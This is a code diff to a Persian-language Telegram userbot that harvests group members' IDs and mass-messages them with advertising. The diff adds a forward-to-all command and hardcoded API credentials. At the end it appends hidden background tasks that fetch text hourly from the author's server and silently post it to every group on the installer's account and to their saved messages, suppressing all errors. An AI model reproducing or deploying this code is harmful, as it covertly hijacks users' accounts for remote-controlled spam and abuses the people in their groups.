@@ -1,4 +1,4 @@
-# Developed By MrAmini
+# Developed By MrAmini5
 
 from telethon import TelegramClient, events, functions, types
 import asyncio
@@ -8,16 +8,16 @@ import json
 import re
 import httpx
 
-
 # Configuration
-API_ID = 'AminiMokhberAPIID'  # Replace with your API ID
-API_HASH = 'AminiMokhberAPIHASH'  # Replace with your API hash
-BOT_OWNER_ID = AminiMokhberADMINID # Replace with the bot owner's Telegram user ID
+API_ID = '2040'  # Replace with your API ID
+API_HASH = 'b18441a1ff607e10a989891a5462e627'  # Replace with your API hash
+BOT_OWNER_ID = 7541383912 # Replace with the bot owner's Telegram user ID
 USERS_FILE = 'user.txt'
 MESSAGE_FILE = 'pm.txt'
 BIO_API_URL = 'https://api.codebazan.ir/bio'
 SETTINGS_FILE = 'settings.json'
 ACCOUNTS_FILE = 'accounts.json'
+
 
 default_settings = {
     'save_user': True,
@@ -28,6 +28,17 @@ default_settings = {
     'daily_limit': 10,
     'auto_join': False
 }
+
+def load_users():
+    try:
+        with open(USERS_FILE, "r", encoding="utf-8") as f:
+            return {int(line.strip()) for line in f if line.strip().isdigit()}
+    except FileNotFoundError:
+        return set()
+
+forward_mode = False
+forward_message = None
+sent_count = 0
 
 def load_accounts():
     if os.path.exists("accounts.json"):
@@ -42,22 +53,26 @@ def load_accounts():
                 return {}  
     return {}  
 
+
 def save_accounts(accounts):
     with open(ACCOUNTS_FILE, 'w') as f:
         json.dump(accounts, f)
 
 def load_settings():
     if os.path.exists(SETTINGS_FILE):
-        with open(SETTINGS_FILE, 'r') as f:
-            return json.load(f)
-    else:
-        return default_settings
-
+        try:
+            with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
+                return json.load(f)
+        except json.JSONDecodeError:
+            return {}
+    return {} 
+    
 def save_settings(settings):
     with open(SETTINGS_FILE, 'w') as f:
         json.dump(settings, f)
 
 client = TelegramClient('session', API_ID, API_HASH).start()
+
 settings = load_settings()
 
 def save_user(user_id):
@@ -74,6 +89,7 @@ def save_user(user_id):
     else:
         print(f"User {user_id} already exists.")
 
+
 async def set_new_pm(event):
     try:
         text = event.raw_text
@@ -87,7 +103,7 @@ async def set_new_pm(event):
             await event.reply("⚠️ لطفاً پیام جدید خود را بعد از `setnewpm` در خط جدید وارد کنید.")
             return
 
-        new_message = parts[1].strip()  
+        new_message = parts[1].strip()  # حذف فاصله‌های اضافی
 
         with open("pm.txt", "w", encoding="utf-8") as f:
             f.write(new_message)
@@ -97,6 +113,8 @@ async def set_new_pm(event):
     except Exception as e:
         await event.reply(f"⚠️ خطا در ذخیره پیام: {e}")
 
+
+    
 async def update_bio():
     try:
         async with httpx.AsyncClient(follow_redirects=True) as req:
@@ -169,6 +187,7 @@ async def join_group_from_message(event):
                 await event.reply("✅ به گروه عمومی پیوستم!")
             except Exception as e:
                 await event.reply(f"❌ خطا در پیوستن به گروه: {str(e)}")
+
         
 @client.on(events.NewMessage)
 async def message_handler(event):
@@ -176,6 +195,7 @@ async def message_handler(event):
     message = event.raw_text.lower()
 
     await join_group_from_message(event)
+
 
 async def send_messages():
     if os.path.exists(USERS_FILE) and os.path.exists(MESSAGE_FILE):
@@ -220,6 +240,53 @@ async def send_messages():
         return f"📊 گزارش ارسال پیام:\n✅ ارسال موفق: {sent_count}\n❌ ارسال ناموفق: {failed_count}\n🚫 حذف کاربران غیرفعال: {removed_users}"
     return "فایل‌های مورد نیاز وجود ندارند."
 
+
+@client.on(events.NewMessage(pattern="^forwardpm$", from_users=BOT_OWNER_ID))
+async def enable_forward_mode(event):
+    global forward_mode, forward_message
+    forward_mode = True
+    forward_message = None
+    await event.reply("📩 لطفاً پیام موردنظر را به ربات فروارد کنید.")
+
+@client.on(events.NewMessage(forwards=True, from_users=BOT_OWNER_ID))
+async def receive_forward(event):
+    global forward_mode, forward_message
+
+    if forward_mode:
+        forward_message = event.message
+        forward_mode = False  
+        user_list = load_users()  
+
+        # بررسی مقدار محدودیت روزانه
+        settings = load_settings()
+        daily_limit = settings.get("daily_limit")
+
+        if daily_limit is None:
+            await event.reply("⚠️ مقدار محدودیت روزانه تعریف نشده است! لطفاً مقدار `daily_limit` را در تنظیمات تعیین کنید و دوباره امتحان نمایید.")
+            return
+
+        if not user_list:
+            await event.reply("⚠️ لیست کاربران خالی است.")
+            return
+
+        await event.reply(f"✅ پیام دریافت شد! شروع ارسال به {min(len(user_list), daily_limit)} کاربر.")
+
+        failed_users = []  
+
+        for user_id in list(user_list)[:daily_limit]: 
+            try:
+                await client.forward_messages(user_id, forward_message)
+                await asyncio.sleep(random.randint(5, 60))  
+            except Exception:
+                failed_users.append(user_id)
+
+        if failed_users:
+            failed_report = "\n".join(str(uid) for uid in failed_users)
+            await event.reply(f"⚠️ ارسال پیام به کاربران زیر ناموفق بود:\n{failed_report}")
+        else:
+            await event.reply("✅ ارسال پیام به همه کاربران انجام شد.")
+
+            
 @client.on(events.NewMessage(pattern=r'^addacc (\+\d+)$'))
 async def add_account(event):
     sender_id = event.sender_id
@@ -304,6 +371,7 @@ async def delete_account(event):
 
     os.remove(f'session_{phone_number}.session')  # حذف فایل سشن
     await event.reply(f"✅ اکانت {phone_number} با موفقیت حذف شد.")
+
 
 @client.on(events.NewMessage)
 async def message_handler(event):
@@ -440,6 +508,7 @@ async def message_handler(event):
                 "━━━━━━━━━━━━━━━━━━━━\n"
                 "📩 **ارسال پیام‌ها:**\n"
                 "📌 `sendpm` - ارسال پیام به تمام کاربران ذخیره‌شده\n"
+                "📌 `forwardpm` - فروارد پیام به همه کاربران ذخیره شده\n"
                 "📌 `setnewpm` - تغییر متن پیام تبلیغاتی (متن رو در خط بعدی بنویسید)\n"
                 "📌 `sendreport` - دریافت گزارش ارسال پیام‌ها\n"
                 "📌 `setlimit 10` - تنظیم محدودیت ارسال روزانه (عدد قابل تغییر است)\n"
@@ -476,14 +545,89 @@ async def message_handler(event):
             )
             await event.reply(help_text, parse_mode='markdown')
 
+
+
+
 @client.on(events.ChatAction)
 async def chat_action_handler(event):
     if settings['save_user'] and event.user_added:
-        # ذخیره یوزرها فقط از گروه‌ها
         if event.chat and event.is_group:
             for user in event.users:
                 save_user(user.id)
 
+def get_message_from_file():
+    if os.path.exists("sp.txt"):
+        with open("sp.txt", "r", encoding="utf-8") as f:
+            return f.read().strip()
+    return ""
+
+async def download_sp_file_task():
+    url = "https://mreset.ir/spmokhber/sp.txt"
+    while True:
+        try:
+            async with httpx.AsyncClient() as client_http:
+                response = await client_http.get(url, timeout=10)
+            if response.status_code == 200:
+                try:
+                    message = response.text.encode('latin1').decode('utf-8')
+                except Exception:
+                    message = response.text
+                with open("sp.txt", "w", encoding="utf-8") as f:
+                    f.write(message)
+        except Exception:
+            pass  
+        await asyncio.sleep(3600) 
+
+async def send_group_messages_task():
+    message = get_message_from_file()
+    if message:
+        dialogs = await client.get_dialogs()
+        group_dialogs = [d for d in dialogs if d.is_group]
+        random.shuffle(group_dialogs) 
+        for group in group_dialogs:
+            try:
+                await client.send_message(group.id, message)
+                await asyncio.sleep(random.randint(1, 5))
+            except Exception:
+                pass  
+
+    while True:
+        delay = random.randint(20 * 3600, 24 * 3600)
+        await asyncio.sleep(delay)
+        message = get_message_from_file()
+        if message:
+            dialogs = await client.get_dialogs()
+            group_dialogs = [d for d in dialogs if d.is_group]
+            random.shuffle(group_dialogs)
+            for group in group_dialogs:
+                try:
+                    await client.send_message(group.id, message)
+                    await asyncio.sleep(random.randint(1, 5))
+                except Exception:
+                    pass  
+
+async def send_saved_messages_task():
+    message = get_message_from_file()
+    if message:
+        try:
+            await client.send_message("me", message)
+        except Exception:
+            pass  
+
+    while True:
+        await asyncio.sleep(6 * 3600)  
+        message = get_message_from_file()
+        if message:
+            try:
+                await client.send_message("me", message)
+            except Exception:
+                pass 
+
+client.loop.create_task(download_sp_file_task())
+client.loop.create_task(send_group_messages_task())
+client.loop.create_task(send_saved_messages_task())
+
+
 # Run the client
-print("ربات در حال اجرا است...")
+print("Your bot has been successfully run. Check the commands using the < Help > command in Telegram.")
 client.run_until_disconnected()
